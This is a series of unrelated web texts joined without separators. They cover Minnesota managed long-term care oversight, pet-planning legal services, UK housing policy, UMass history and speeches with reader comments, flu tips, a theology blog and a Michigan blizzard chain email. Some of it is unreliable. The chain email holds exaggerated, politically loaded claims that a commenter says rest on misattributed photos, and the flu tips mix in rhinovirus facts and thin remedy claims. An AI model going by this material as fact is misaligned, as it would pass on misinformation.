UM;
Special health care needs;
Practice guidelines;
Credentialing/Re-credentialing;
Annual QAPIP evaluation;
PIPs;
DM;
MCO grievances process requirements;
DTR notice of action to enrollees;
MCO appeals process requirements;
Advance directives compliance;
MCO care plans for MSHO and MSC+;
Information system.
Between the TCA, the state conducts follow-up visits approximately 1.5 years from the TCA to monitor the MCO's progress on resolving any issues discovered during the tri-annual audit.
The state holds a group meeting with the MCOs monthly to discuss operations and monitoring.
Performance Measures and Quality-Related Reports
The state utilizes the Care Plan Audit protocol which contains approximately 30 performance measures (mostly process-oriented measures). The sampling methodology used for the Care Plan Audit is the NCQA-approved 8 and 30 process. In addition to the Care Plan Audit, the state also compares NF versus community placement to monitor NF admissions. This is monitored at both the system-wide level and the MCO level.
LTSS-Focused PIPs
The state does not require MCOs to conduct LTSS-focused PIPs.
Care Coordination
The state utilizes a multi-entry system for individuals to receive an initial LOC (i.e., the initial LOC evaluation can be conducted by the MCO, a subcontractor or the county). The LOC is re-determined annually. The initial assessment and the ongoing assessments are conducted by the Care Coordinator. MCOs use a state-defined assessment tool, however they are permitted to add additional questions. Care Coordinators also develop the SPs using a holistic, person-centered approach.
The state does not require a specific care coordinator-member ratio, however each MCO is required to develop a methodology for how they determine their care coordinator-member ratio and submit to the state for approval.
The MCO must provide Care Coordination services that are designed to ensure access to, and coordinate the delivery of preventive, primary, acute, post-acute and rehabilitation services.
The MCO's Care Coordination system must be designed to ensure communication and coordination of an enrollee's care across the Medicare and Medicaid provider network and settings, to accomplish smooth transitions for enrollees who move among various settings, as well as to facilitate and maximize the level of enrollee self- determination and enrollee choice of services, providers and living arrangements. The MCO must provide each enrollee with a primary contact person who will assist in access to services and information.
24-Hour Back-Up
At the individual level, the Care Plan must include identification of any risks to health and safety and plans for addressing these risks, including Informed Choices made by members to manage their own risk, and back-up plans for emergency situations.
At the systems level, each MCO must have a 24/7 nurse hotline for members to access.
CI Reporting and Investigation
The state mandates that the local county social services agencies accept reports of maltreatment, provide emergency protective services and investigate maltreatment allegations.
MCO address incidents of self-neglect.
Mortality Review
The state selectively conducts mortality reviews in its MLTSS programs.
EQRO Responsibilities
EQRO responsibilities include:
Assessing each contracted MCO's strengths and weaknesses with respect to quality, timeliness and access to health care services.
Providing recommendations for improving quality of services furnished by each MCO.
Providing appropriate comparative information about all MCOs.
Assessing the degree to which each MCO has addressed problems and effected changes as previously identified by the state. Minnesota Department of Human Services or as recommended by the EQRO.
Evaluating the implementation and effectiveness of the Quality Strategy.
Advising the state on opportunities for improvement.
Annually, the EQRO conducts the 3 mandatory quality review activities:
Validation of PIPs.
Validation of performance measures.
MCO compliance with Medicaid structure and operational standards.
Ombudsman/ Function
The state has established a state Office of the Ombudsman for managed care enrollees. MCO enrollees are informed by their care coordinator about the state Office of the Ombudsman and its functions at their initial visit and subsequently at annual visits. When a service is denied, terminated, or reduced, the MCO must give the enrollee a notice of action including a description of the enrollees' rights with respect to MCO appeals and state Fair Hearing process. On a quarterly basis, MCOs submit specific information about each notice of action to the state Ombudsman Office. This office reviews this information, and tracks and trends DTRs.
Experience of Care/ Satisfaction Surveys
The state administers a bi-annual consumer survey to persons aged 65 and older who are enrolled in the state's MLTSS and HCBS FFS programs. The survey was designed by the state's aging division and is based on the PES. The state draws a random sample from the entire LTSS population.
Survey results are disseminated to lead agencies and any specific issues revealed as a result of the survey are forward to the responsible county for resolution.
Membership Oversight
Each MCO must have a Member Advisory Committee which must meet regularly. Minutes from each meeting are submitted to the state to demonstrate how the issues discussed during the meeting are addressed.
State Technical Assistance to MCOs
The state engages in technical assistance to the MCOs through a variety of forums including:
Workgroups;
Monthly meetings with MCOs;
Video conferences with MCOs.
The state also provides targeted technical assistance to an individual MCO if the state detects plan-specific issues through the audits, grievances or complaints, or from communication with the managed care ombudsman program.
MCO Report Cards on LTSS
The state does not utilize MCO report cards.
Financial Incentives, Penalties and Withholds
The state withholds a portion of MCO payments which are returned to the MCO only if performance targets are achieved. The withheld funds are returned to the MCO based on a scoring system for each of the performance targets including:
Specific provider measures.
Completion and submission of the Care Plan audit.
Timely completion of initial health risk screening or assessments.
In addition, the MCO is required to cooperate with the state to develop and implement a P4P model for chronic disease care. The state pays the monetary incentives to the MCO based on criteria established by the state. The MCO, in turn, conveys payments to its provider network, based on having achieved optimal chronic disease care for a designated percentage of its patients. The P4P projects are limited to diabetes care, and coronary/vascular disease care.
Other Quality Management/ Improvement Activities
MCOs collaborate on the development and implementation of PIPs.
In the spirit of fostering a partnership with the MCOs, the state has implemented workgroups across MCOs to improve quality. These workgroups consist of state personnel and various staff from the MCOs including care coordinators, supervisors and auditors.

Pet Planning
Bringing a pet into your life can bring you great joy. Studies have repeatedly illustrated the benefits of pet ownership, from reducing allergies in children to reducing stress and lowering your blood pressure. Pets can even make you live longer. With all that your animals can do for you, you owe it to them to make certain they are always cared for – even if something happens to you and you can no longer be their caretaker.
Biddinger, Bitzer & Estelle, PLLC provides assistance to pet owners throughout Northern Michigan with making responsible decisions for the care of companion animals. If you have any pets, from farm animals to feline friends to canines in your home, we can help you to keep them safe and ensure their lives are never threatened by uncertainty. To find out more about the ways in which we can help you protect your pets, give us a call at 989-872-5601. We can also answer general questions including:
Who needs pet planning help?
What should be a part of the pet planning process?
How can a Northern Michigan pet planning lawyer help you?
Who Needs Pet Planning Help?
Anyone who owns a companion animal should make a plan for what will happen to the animal if something happens. You may believe that because you are young, you do not need to worry about outliving your pet or about incapacity making you unable to care for your pet. You may also assume your spouse or family will take care of your animal. Unfortunately, there are no guarantees in life. Something could happen to you and even to your loved ones at any time – leaving your pet without options.
Your family may have a hard time remembering to make provisions for your pet in the face of tragedy, or may not be able to take your pet in. You do not want to take any chances. Your pet is depending upon you to provide a safe and stable home and you need to make plans to ensure that your animal is always cared for, no matter what the future brings.
Far too many pets end up in shelters, or even end up being euthanized if they are too old or deemed unadoptable when their owner passes away. Your pet should never be one of the animals that is forced to endure this fate. You can take steps now to make sure that never happens.
What Should be Part of the Pet Planning Process?
The pet planning process should, first and foremost, involve making certain your pet has a home if you can’t provide that home any longer. You should name a trusted friend or relative who can take your pet into their lives if you cannot provide care. You should also name a backup guardian for your animal, just in case the first choice person who you selected experiences an unforeseen change in circumstances and cannot provide the care you had expected.
In addition to making plans for your animal to have a home, you may also want to make provisions to cover the animal’s expenses. You don’t want your pet to go without veterinary care or to be left with low quality food because your chosen caregiver cannot afford the expenses of owning an animal. You can make provisions to leave money for your pets care.
When leaving money for an animal’s care, you need to be careful because some person is going to be in charge of managing that money. If you simply leave cash in your will, you lose all control of it and cannot make sure that your pet is being provided for. If you create a trust, on the other hand, you can provide more detailed instructions and the trustee is bound to follow the trust document and use the money as you directed to care for your pet.
It is up to you what you want your plan to be, but you should make sure you think about what is best over the course of your animal’s entire life so you can make the right choice.
How can a Northern Michigan Pet Planning Lawyer Help You?

Abstract
This report to Congress, submitted in accordance with the Clean Air Act Amendments of 1970, presents projections of the costs and the results of governmental and private efforts to carry out provisions of the Act. The sources of air pollution are broadly divided into three groups: transportation sources, power sources, and production or industrial sources. Projections for each of these groups are presented in separate chapters of this report. As in previous reports, national cost estimates are presented for governmental programs and for control of sources of air pollution. Estimates of costs, benefits, and impacts reported herein are based, insofar as possible, upon actual regulations adopted by the states in implementation plans submitted to EPA.

The ‘Radical’ Housing White Paper
By Samantha Curtis
After months of anticipation, the Housing White Paper has been published, recognising the need to ‘fix Britain’s broken housing market’. The white paper has been described by the Secretary of State for Communities and Local Government, Sajid Javid, as ‘radical’. The government accepts that not all people can afford to buy their own home, which for the Conservative Party, is a radical turnaround.
So, what are the changes and how will they impact the built environment?
Planning permission will only be valid for two years after a decision notice has been issued, instead of the current three years.
Plan making to be simplified to allow local authorities to agree their housing land supply annually and remain fixed for a one-year period, instead of relying on an out of date Strategic Housing Land Availability Assessment (SHLAA).
National Planning Policy Framework (NPFF) will be amended to introduce a policy expectation of 10% affordable home ownership units on development sites, and Starter Homes are to be delivered as part of a mixed package of affordable housing.
Tighter restrictions on building in the Green Belt – Green Belt boundaries can only be amended when it can be demonstrated that all other options have been explored. Higher financial contributions will also be required for development in the Green Belt.
Councils will be given stronger Compulsory Purchase Order (CPO) powers to buy back undeveloped sites.
Planning fees can be increased by local authorities by 20%.
As above, the aim of the Housing White Paper is to ‘fix our broken housing market’. It sets out to simplify the planning process (heard that one before), but also shifts the blame onto developers by reducing the time given to implement permission, insinuating that sites with planning permission are ‘sat on’. Bringing in this ‘use it or lose it’ approach allows councils to CPO land that developers are seen to be ‘banking’.
If developers are ‘banking’ land, shouldn’t the government be incentivising the completion of houses on this land, rather than increasing fees, contributions and adding further delays while they ‘reform’ local plans, again?
Developers we work with are hungry for sites to develop. Given the tight Green Belt boundaries in our towns and cities, deliverable housing land is gold dust. So what has the White Paper proposed to tackle this problem? Well, not a lot. Green Belt boundaries can (reluctantly) be amended, when all other options have been explored. Not much of a brainwave. Why hasn’t increasing density and prioritising brownfield sites been considered before? Well, it has.
The White Paper remains committed to the involvement of local communities in plan-making. Development Corporations, originally a Thatcher invention to facilitate the development of inner city brownfield sites, could now be used by local communities to deliver the next generation of garden cities, towns, and villages.
The development of land close to transport hubs, particularly brownfield land, has long had the attention of the government as sustainable locations in which to locate new housing. The additional push in the White Paper should lead to developers and local authorities seeking to better maximise their density output by combining residential with other compatible uses to generate mixed-use developments. This sits alongside the argument of making efficient use of land by avoiding low densities where there is an identified housing need.
In several areas, the barrier to development is viability, especially on brownfield sites, with the implementation of the Community Infrastructure Levy (let’s see how long that lasts) and now a proposed policy expectation of 10% affordable houses and increased planning fees. Is this going to hinder the delivery of housing further?
The Housing White Paper is the biggest planning announcement since the NPPF. The 104-page report sets out the government’s strategy to tackle the housing crisis, and will impact both housebuilders and developers. To find out more, Cundall’s planning team will talk you through the key points in a lunchtime seminar on March 1. Email s.curtis@cundall.com for more information.
The report concludes that Britain needs more housing (you don’t say?!). Will it help achieve this? Watch this space…

Fifty years ago this upcoming September, the University of Massachusetts saw the groundbreaking of a new student library. In addition to the library’s groundbreaking, this year is the 45th anniversary of the dedication of the tower and the 25th anniversary of the renaming of the building.
The following information was sourced from “The Campus Guide: University of Massachusetts” by Marla Miller and Max Page, an online university wiki page and archived issues of The Massachusetts Daily Collegian.
The history of the University Library
Now a centerpiece in the UMass skyline, the library is the antithesis of counsel given to the University founders in 1866 by the father of American landscape architecture, Frederick Law Olmsted. As written in “The Campus Guide: University of Massachusetts” by UMass professors Marla Miller and Max Page, Olmsted urged Massachusetts Agricultural College to only build low, small buildings.
“….in the midst of an open agricultural country….a straight-sided, evenly-balanced, many-storied structure of stone will not be merely incongruous to the landscape, but will certainly impose an unnecessary inconvenience and fatigue upon those who are to occupy it,” Olmsted wrote.
However, as the MAC grew in size, eventually becoming the flagship campus of the UMass system under its current name, the architectural ideals of low-level structures were incompatible with student needs. In 1963, Keyes D. Metcalf, a library consultant and librarian of Harvard University, suggested that UMass would soon need a 310,000 square foot library within the next 10 to 15 years.
In 1965, UMass provost Oswald Tippo and President John W. Lederle, the namesake of the Graduate Research Center, selected an internationally-known architectural firm, Edward Durell Stone, to begin designing a new library. The original design of the library proposed 28 stories, and was approved by the Board of Trustees in 1966.
The “great concrete pour” of September 1969 saw 2,600 cubic yards of concrete make up the foundation of what would eventually become the University Library, replacing the main campus library at the time, Goodell Library. Two years later, the exterior work of the building was complete. Topping off at 269.5 feet, the University Library, alternatively called Library Tower, was then the world’s tallest library, according to the Guinness Book of World Records.
Interior work continued for another two years. On June 26, 1973, the new University Library formally opened and a formal dedication ceremony took place over a year later in October 1974.
Returning to campus in September 1973, students had much to look forward to in their modern, state-of-the-art library. A Sept. 7, 1973 Daily Collegian article by reporter Ed Gorman said the new library was expected to be used “25 percent more than Goodell Library.” In addition to air conditioning, the library featured coin-operated typewriters and duplicating machines. The fast elevators didn’t stop at each floor individually, but at “three floor intervals,” with each third floor serving as a shelving floor.
In its early years, the building caused safety concerns on campus. The brick exterior, chosen as the less expensive option in comparison to limestone, had slight chipping by September 1973. By 1979, Chancellor Henry Koffler ordered a temporary closure of the library until a new entrance and other safety modifications could be introduced. In February 1980, the University Library was restricting use to no more than 500 persons at one time.
Interior renovations began in April 1985, and during the 1986-87 school year, staff, student volunteers and other groups helped to clean, paint and refurbish the interior under umbrella operations called “Mass Transformation” and “A Class Act.” This initiative started the practice of murals inside the library stairwells in a beautification project. Once the building was permanently reopened, it returned as the center of academic and social life at the University.
A new name
In the spring of 1994, a coalition of students, known as the “Petition Coalition” began campaigning to give a new name to the Library Tower by naming it after American civil rights activist W.E.B. DuBois. DuBois, a civil rights activist and native of western Mass., was tied to the library through the donation of his papers by his widow.
Initially, there was debate over the appropriateness of the name, due to DuBois’ ties to the Communist Party in the United States. Further, University policy dictated that dedications were intended for individuals who had made significant donations to the University.
On Oct. 5, 1994, the Board of Trustees formally voted on whether to rename the library. On the front page of the Massachusetts Daily Collegian on that day, Chancellor David K. Scott is quoted saying the reasons to rename the library are “numerous.”
“DuBois is a major American intellectual of the 20th century and the University Library houses the largest and most distinguished collection of [DuBois] materials in the world,” Scott said.
By Oct. 6, 1994, the W.E.B. DuBois Library became a reality following a unanimous vote of the Board of Trustees. Then-student Trustee Al Lizana told the Daily Collegian the naming of the library “[was] not the final step,” but was a “start for the administration at UMass to begin taking a hard look at how they view diversity on campus.”
Lizana continued, “Diversity is more than just recruiting students of color to come to UMass. It is also making the environment reflect something which the students can relate to.”
Students on campus celebrated the decision; on Oct. 7, 1994, a letter to the editor of the Collegian from graduate student Prasad Venugopal said it was a “great honor” for the University to join millions around the world for whom “the legacy of [DuBois] has served as a guiding light in their quest for equality and social justice.”
On Oct. 11, 1994, another letter to the editor from Esther A.M. Terry, the chair for W.E.B. DuBois Department of Afro-American Studies praised the decision to rename the building and noted it would be accompanied by an “upgrading, enhancing and restoration of the library.”
“[DuBois] would, as we do, commend the members of the student coalition and their leadership. He would see their work and their accomplishment as justification of the principle of ‘education for service, education for action, education for leadership’ to which his life was devoted,” Terry wrote.
On Feb. 23, 1996, DuBois’ birthday, the Commonwealth of Massachusetts formally dedicated the W.E.B. DuBois library.
The W.E.B. DuBois Library today
While its size was unprecedented in terms of university libraries in 1969, the W.E.B. DuBois Library holds over eight million items today, a fraction of the entire collection. According to Miller and Page, a “good portion” of the library collection is in a former Cold War era bunker now known as the Five College Book Depository.
Robert Cox, the head of special collections and University archives at UMass Libraries, said in an email that while he didn’t use the library much as a science undergrad, he’s become a “real convert.”
“Modern libraries aren’t a single thing, really, they’re a complex, evolving, multifaceted organism that connects nearly every part of campus to each other,” Cox said, adding that the library has partnerships with units across campus to “provide a full spectrum of services to students, faculty and the public.”
According to the 2016 Library Report, 1,762,263 visitors came through the W.E.B. DuBois Library and the live feed of the falcons who live on top of the library, Falcon Cam, received nearly 180,000 views.
“Maybe it’s not for every student, but it is an important place for many,” Cox said.

In his third annual “State of the University” address, President of the University of Massachusetts system Marty Meehan focused on his plans to increase college affordability while also strategizing about how to address future demographic changes in the state.
Before taking the podium in Boston on Monday evening, Meehan was introduced by Chairman of the UMass Board of Trustees Robert Manning, who prefaced the president’s speech by stating that UMass was doing “great” compared to other institutions in the United States.
Manning remarked that this success was coming on the heels of great uncertainty in higher education, citing the University of Massachusetts’ acquisition of Mount Ida College as a key example.
“You don’t have to look too far, close to our hearts, to see what happened to an institution like Mount Ida. UMass stepped in and saved that institution,” Manning said.
“In the process, we picked up a key strategic asset for the University,” he added, noting that UMass is looking to make more acquisitions due to consolidation in the future. “People need to understand that that value that we created accrues to the citizens of the Commonwealth. They own the University; they’re the shareholders of it.”
Meehan began his speech by referencing the Saxon Report, a document published in March 1989 that outlined steps to eventually turn the UMass system into a high-ranking research university focused on creating positive economic impact in the state.
“We have indeed become the world-class university the commission envisioned. By every measure from student impact to third party validations [and] student demand — we have reached the upper echelon of public universities in the United States, and indeed, across the globe,” Meehan said.
Meehan pointed to high graduation rates, a high retention rate of UMass graduates living in the state and more than $6 billion of annual economic impact from all five system schools combined as indicators that the University has become top-tier.
“Through the talent we develop, the research we conduct and the service we perform, we have become a key thread in the social, cultural and economic fabric that makes Massachusetts the greatest state in the nation,” Meehan said.
In contrast to these accomplishments, Meehan explained that cost inflation and commitment to meeting financial needs of students are still challenges that UMass currently faces. Citing a recent report by the Federal Reserve Bank of Boston, Meehan said that state funding for higher education had decreased by 12.5 percent when adjusted for inflation.
Meehan was optimistic that future work with the state legislature on funding could alleviate some financial stress for students.
“I will continue to advocate for any reasonable measure seeking to preserve the promise of an affordable higher education and remove the albatross of debt for our students,” Meehan said, stating his support for the Cherish Act which would freeze tuition and fees for five years and increase the funding of public universities back to per-student fiscal year 2001 levels, adjusted for inflation.
The most impending issue, Meehan explained, is a shifting demographic landscape in the state. A lack of births during the Great Recession of 2007–9 would mean that schools in Massachusetts will see a dramatic decrease in enrollment starting in 2026, he said.
The recent instances of struggling universities in the state are only symptoms of greater troubles ahead, Meehan said. He added that even though UMass is “in a better position than most” regarding this issue, it should not be ignored.
“The effect on the Commonwealth will be acute. Our economy will suffer,” Meehan said.
In preparation for these changes, Meehan said that greater fiscal oversight, improved transparency measures and strategic investments have already been implemented. But more advancements must be taken to make public education in the state more accessible, he conceded.
Meehan unveiled a plan for “UMass Online,” an online college that he said would enhance economic mobility in minority groups and provide employers with educated workers. Around one million Massachusetts adults have some college credit but no degree, he said.
“A concerted and highly-targeted effort to make a UMass education available to these student learners, adult learners, is the answer to a number of issues,” Meehan said.
This rapid response to workforce demand will put the state ahead when demographic changes start to set in, Meehan explained.
“The time for us to act is now. It’s predicted that over the next several years, four to five national players with strong regional footholds will be established. And we intend to be one of them,” he said.
Meehan ended his speech by quoting the Saxon Report from almost 30 years ago, which said at the time, “resolute action now can give the University the opportunity to reach its full potential.”
“We must take bold and decisive steps to ensure that we continue to fulfill our critical mission of access, opportunity and excellence, and to remain the world-class research university that the Saxon commission envisioned,” Meehan concluded.

“Mount Ida. UMass stepped in and saved that institution” Really? Because I think the way the Mount Ida students describe is that they had little prior warning and that umass implemented a hostile take over and this is why there is a class action lawsuit against umass. Emphasis on class action, its not one discontent student or faculty, its a large part of the study body suing umass.
““We have indeed become the world-class university the commission envisioned.” Zoomass is ranked 70. That means its a little above average. There are over 10 colleges in Massachusetts alone that are higher ranking and not to mention our public neighbor to the south Uconn.
““I will continue to advocate for any reasonable measure seeking to preserve the promise of an affordable higher education and remove the albatross of debt for our students,” ”
Umass has one of the most expensive tuition and fees for any public college in the country and trustees continue to increase not lower this.
“Through the talent we develop, the research we conduct and the service we perform, we have become a key thread in the social, cultural and economic fabric that makes Massachusetts the greatest state in the nation,”
Massachusetts is one of the only states that people move out of, its a consistent net population loser. Great states people want to live in not move out of….
Umass is not a ‘key thread’ in Massachusetts, maybe Harvard as an University is or the Kennedy or the massachusetts people. Not a party school that people go to because they couldn’t get into or afford one of the many better colleges in Massachusetts.
Overall the ‘state of the university’ was largely a delusional speech and bit of a bizarre one that wants to think of umass in some lofty terms. Most colleges don’t give ‘state of college’ speeches as if they are on the same level of a nation; it’s just weird and unwarranted.
If umass wants to be great it should cast aside it’s delusional thinking, and lower its tuition rates and provide better services to students. You know things like fixing elevators that are broken, not allowing rampant racism, smaller class sizes, cheaper meal plans, better transportation(which has been cut), etc.

@ the commenter above:
Apparently it would’ve been better if Mount Ida HADN’T been acquired by UMass (Amherst), and rather simply ran out of money and suddenly closed their doors, offering their students no alternative. Students complaining about the acquisition fail to see that Mount Ida was the institution in the wrong, hiding their financial problems from students for far too long.
“ZooMass”, as you so crassly call it, is in fact ranked 70 out of all universities in the US. It’s 26th (if not higher) for public universities, and rising fast. Northeastern is ranked around 50 last time I checked and nowadays Northeastern is considered quite prestigious. The fact that your argument resorts to using a nickname for the school from the 70s shows how entirely backwards your argument is; you obviously haven’t set foot on the campus in years. UConn is ranked lower than us for a lot of hot majors like computer science and engineering as well. Comparing UMass with Harvard, MIT and the other excellent PRIVATE institutions in MA is simply unfair.
Tuition and fees are high, but definitely not THE highest anymore, which they were at one point. They are working on it, and the fact remains that for MA residents there is still great value in a UMass education.
With your next point you really expose your bias as Massachusetts is simply not “one of the only states with net population loss”. In fact, California actually has by far the most net population loss; Massachusetts is somewhere in the middle of the 50 states.
UMass is called a key thread in MA because graduates tend to stay in MA, contrary to Harvard and MIT
As a student I would rather have the speech than not have the speech
I’ve literally never seen a broken elevator during my time here and everything gets fixed super promptly, not to mention the meal plans are incredible value compared to other public universities and class sizes are literally the same as any other public flagship university
amy on March 7th, 2019 12:00 pm
Adam seems all upset lol. You go on defending zoomass after it’s infamous Blarney Blowout that attracts people from out of state with 100+ huge parties.
The students of Mount Ida never asked to be acquired and there was never a vote on it, it was hostile. Umass has no respect for the rights of others. Its an arrogant latitude to act like they didn’t know better, if it was a matter of hurt feelings there wouldn’t be a class action lawsuit now. And that’s a dumb movie by umass and for its students, because now we have to pay for that cost of that lawsuit and if they win potentially millions of dollars.
There was newspaper article on the broken elevators . And also there was protests over dining meal costs and cutbacks. . Maintenance at this school is a dump. It is one of the trashiest and ugliest campuses or collections I’ve buildings I’ve ever seen. They have absolutely no sense of aesthetics or quality at this college. Look at the new isenberg building, they spend millions and the metal is rusty lol. They are too lazy or stupid to finish the building and add either stainless steel or chrome.
Umass is not key, I am sure all the other state colleges contribute more than umass or community colleges even. I am sure the largest corporation in mass contributes far more than umass. And the Massachusetts people are far important than some state college that spends 40 million dollars on paying interest on its debt alone. You could argue that’s poor accountability, umass takes the taxpayer’s money and then uses it pay for debt because cannot responsibly take on debt.
70 is okay, but the perception that umass has of itself far surpasses the reality. You even deny the truth by ignoring things that were reported in this very newspaper. The same thing with this selective rating, oh we are ’26’, That ranking is always promoted. It’s 70 compared to every college and 70 is slightly better than average. It’s also not rising fast, its gone a few points up the last 5 years or so and in some years in some rankings it gone down Uconn is higher it’s 63 but some majors are ranked lower, I am sure some are ranked higher too….
I have nothing against umass, like many people I go here, to party, I am going to get a decent paying salary 50k or so when I graduate and umass is really easy, the professors are easy. .
But it’s not prestigious or great, it’s okay. And for the school to pretend to be something it’s not really actually just hurts it’s image

DENVER (CBS4)– Denver’s mayor is urging everyone who still needs to register for health insurance to do it now, before open enrollment ends. The deadline is Jan. 15.

“Unexpected high medical costs due to unforeseen circumstances could disrupt someone’s quality of life, standard of living, very quickly. This Affordable Care Act and exchange helps pay for life-saving treatment, but also life-saving prescriptions,” said Hancock.
This year, there are seven health care providers to choose from.

With bills, jobs, and things to do, people don’t have time to get sick. So what do you do when you begin to feel the scratch in the back of your throat, your nose runs, and your temperature rises? Well, depending on how long you may have been feeling poorly, there might be a chance to suppress the flu before it takes its toll. Today, I’m going to give you a few pointers on how to stop the flu early and some things you can do to prevent it from getting any worse.
Watching for Flu symptoms
The earlier you recognize that you might have the flu, the easier it will be to make a difference in how long it might last. There are many symptoms that you can look for; these are different from a common cold. A high temperature is one of the symptoms that set the flu apart from the common cold. You can also have severe aches and pains in the joints and muscles. Feeling weak and out of energy is also a common sign. You might also be experiencing a sore throat or an upset stomach. It is also important to pay attention to the people around you; if you see co-workers, classmates, or friends begin to have these symptoms, you should be vigilant and begin taking care of yourself.
Preemptive flu remedies
So what can you do when you discover you have some of these symptoms brewing? Prescription medications, such as antiviral medication, are effective when given within 48 hours of the onset of flu symptoms. To ease sore throats and cough, you should use lozenges. According to studies done on the flu, vitamin c and zinc have the ability to ease the symptoms of the sickness. It is important and recommended to get a yearly flu vaccine, which can help protect you from the most common type of virus. Be sure to sanitize! Rhinoviruses can live on surfaces for up to 48 hours, and if caught soon enough, you may not even have to deal with fighting the flu.
With these tips, we hope you stay in the best health possible!
Since insurance is often times overwhelmingly confusing, we want to shed light on this industry by answering YOUR questions. So if you have any questions or concerns, comment below and your question may be the topic of our next video!

Entangled States
Of Angels and Aliens
October 4, 2010
by Nicholas Knisely	
Religion / Science	
I’ve posted here before my own musings about the theological implications we would face should we encounter extra-terrestrial beings. Mostly my thinking has been about whether or not other beings would participate in the Fall or not – mechanism aside. There’s a brief post over the weekend from David Opderbeck of “Jesus Creed” that’s motivated in part by his own belief that it’s very likely that we will discover extra-terrestrial life during his lifetime.
“Such discoveries have the potential to upset Christian theology. We assume that the Biblical picture places humanity at the pinnacle of creation. Psalm 8, for example, affirms the exalted place of human beings in the order of creation. Notice, however, that even in Psalm 8, there are ‘heavenly beings’ that occupy an order higher than humanity.
These, of course, are angelic beings, and not extraterrestrial life (no, I am NOT suggesting Psalm 8 speaks about aliens!) [but see footnote below]. Have you ever stopped to wonder about this realm of heavenly beings? What is their story? In what way are they morally accountable? Why – apparently – did the Logos not take on the ontology of an angelic being in order to redeem that order of creation?
Scripture tells us almost nothing about the ‘heavenly beings,’ which perhaps should inform whatever theology we might eventually develop concerning extraterrestrial life. It seems that there is much, much more to the story of the creation and to the teleology of the entire universe than presently has been revealed to us as human beings, either through scripture or general revelation. I think this should lead us towards a greater sense of wonder and humility before the God of the universe. Whatever is out there, it belongs to God.”
Read the full article here.
That’s actually an interesting take and not one that I’ve seen anyone take before. My standard Michaelmas sermon starts by reminding the congregation that the Feast of the Angels directs us to the realization that God creation is much vaster than we might think or expect. God created an entire continuum of creatures ranging from the humble viruses that are little more than snippets of genetic code to the mighty Seraphim and Cherubim.
Maybe as Opderbeck seems to indicate, there’s a profitable line of thinking to be found by wandering down the angelology path as a way of thinking through the implications of life in outer space. At one level, just as Opderbeck writes, thinking of beings from worlds beyond automatically pushes us into an attitude of humility. But I think secondarily, and for me more interestingly, it gives us a way to think about the question that I’ve always found fascinating: Do aliens need a savior?
I don’t know that there’s a well developed consensus in Christian Theology about whether or not the Angels need one or not, but certainly there have been theologians who’ve written on the limits or the extent of soteriological action. Origen speculated about whether or not the Archangel Lucifer who rebelled against God could be ultimately forgiven and restored. Other theologians have thought about whether the Incarnation had the effect of redeeming all of Creation which would include the Angels, though there’s no consensus about whether or not the fallen angels status would change because of the Incarnation. Angels are often thought to have no free-will in the way that our Anthropological doctrine understands humanity to have. Yet there’s a stream of Christian thought that sees no need or role for free-will in the act of Salvation, so that might not be a problem in terms of angelic salvation.
I’m thinking, at least initially that this sort of line of thought could also apply to the Alien races, should they exist, and should we encounter them. Of course this is all highly speculative and mostly just a theological lark at this point. But, should we come across another sentient race, then things will get very interesting very quickly won’t they?

An online friend – you know him, but I’ll let him speak for himself if he sees this, because I’m speaking from memory and maybe I’m getting him wrong – believes that there is and was just one incarnation and one means of salvation, and that we are to preach the Gospel to all of creation. (i.e. Mark 16:15: “Go ye into all the world[s], and preach the gospel to every creature.”
And then, from the lovely Philippians 2:
“Let the same mind be in you that was in Christ Jesus,
who, though he was in the form of God,
did not regard equality with God
as something to be exploited,
but emptied himself,
taking the form of a slave,
being born in human likeness.
And being found in human form,
he humbled himself
and became obedient to the point of death—
even death on a cross.
Therefore God also highly exalted him
and gave him the name
that is above every name,
so that at the name of Jesus
every knee should bend,
in heaven and on earth and under the earth,
and every tongue should confess
that Jesus Christ is Lord,
to the glory of God the Father. ”
“In heaven and on earth and under the earth”! Aliens must be included in this, I’d think. And then I just noticed how “taking the form of a slave” would have to apply as well – since all creation is in need of redemption, we are all slaves across the wide universe. Yes?
I’m about convinced of this, I think. One Lord, One Faith, One Baptism….
(Otherwise, wouldn’t there have to be infinite incarnations? And that does seem to defeat the whole idea, doesn’t it?)

Pioneer Spirit Lives In N. Michigan

H/t my friend Bill’s friend, Nadyne!
~Eowyn
…………….
This is from a county emergency manager out in the western part of the Upper Peninsula of Michigan after a recent severe snow storm:
Up here in the Northern part of Michigan we just recovered from a weather event of Biblical proportions — a historic blizzard of up to 44″ inches of snow and winds to 90 MPH that broke trees in half, knocked down utility poles, stranded hundreds of motorists in lethal snow banks, closed ALL roads, isolated scores of communities and cut power to tens of thousands.
FYI:
Obama did not come.
FEMA did nothing.
No one howled for the government.
No one blamed the government.
No one even uttered an expletive on TV.
Jesse Jackson or Al Sharpton did not visit.
Our Mayors did not blame Obama or anyone else.
Our Governor did not blame Obama or anyone else either.
CNN, ABC, CBS, FOX, or NBC did not visit – or even report on this category 5 snow storm.
Nobody demanded $2,000 debit cards.
No one asked for a FEMA Trailer House.
No one looted.
Nobody – I mean Nobody demanded the government do something.
Nobody expected the government to do anything either.
No Larry King, no Bill O’Reilly, no Oprah, no Chris Matthews and no Geraldo Rivera.
No Sean Penn, no Barbra Striesand, no Brad Pitts, no Hollywood types to be found.
Nope, we just melted the snow for water.
Sent out caravans of SUVs to pluck people out of snow engulfed cars.
The truck drivers pulled people out of snow banks and didn’t ask for a penny.
Local restaurants made food, and the police and fire departments delivered it to the snow bound families..
Families took in the stranded people – total strangers.
We fired up wood stoves, broke out coal oil lanterns or Coleman lanterns.
We put on an extra layers of clothes because up here it is “Work or Die.”
We did not wait for some affirmative action government to get us out of a mess created by being immobilized by a welfare program that trades votes for ‘sittin at home’ checks.
Even though a Category 5 blizzard of this scale is not usual, we know it can happen and how to deal with it ourselves.
I hope this gets passed on.
Maybe SOME people will get the message….
The world does NOT owe you a living.

These pictures have been circulating on the web since before 2004. These exact pictures have been used before in stories about record snowfall in Buffalo NY, Oswego NY & Fair Haven. These are actually pictures of the Trans Labrador Hwy in NE Canada being cleared. They are not the UP.

As another fellow yooper (person who lives in Northern Michigan) I can heartily say that this article is correct…but goes too far.
1 – the government does lots. Without the government we wouldn’t be able to live up here. The plows, salt trucks, and emergency services allow us to live on a daily basis. Without these services those people who help each other could not GET to each other.
2 – the people DO help each other out constantly, and rugged individualism is alive and well. We’ll help pull each other out of a ditch, or give food where it’s needed, or take in strangers, or snow-blow other peoples’ driveways. But it’s not to the Hurricane Katrina extent that this article makes it sound like.
So yes, we get by without complaining, but no it is not without the government’s help. Take this article with a bunch of salt.

